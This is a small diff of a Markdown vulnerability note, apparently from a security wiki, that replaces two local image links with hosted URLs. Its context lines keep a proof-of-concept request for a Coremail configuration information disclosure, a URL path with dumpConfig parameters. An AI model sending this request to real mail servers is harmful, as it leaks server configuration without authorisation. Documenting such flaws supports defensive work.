@@ -24,7 +24,7 @@ POC为
 http://xxx.xxx.xxx.xxx/mailsms/s?func=ADMIN:appState&dumpConfig=/
 ```
 
-![](image/co-1.png)
+![](http://wikioss.peiqi.tech/vuln/co-1.png)
 
 ## Goby & POC
 
@@ -32,4 +32,4 @@ http://xxx.xxx.xxx.xxx/mailsms/s?func=ADMIN:appState&dumpConfig=/
 >
 > Coremail configuration information disclosure
 
-![](image/co-2.png)
+![](http://wikioss.peiqi.tech/vuln/co-2.png)
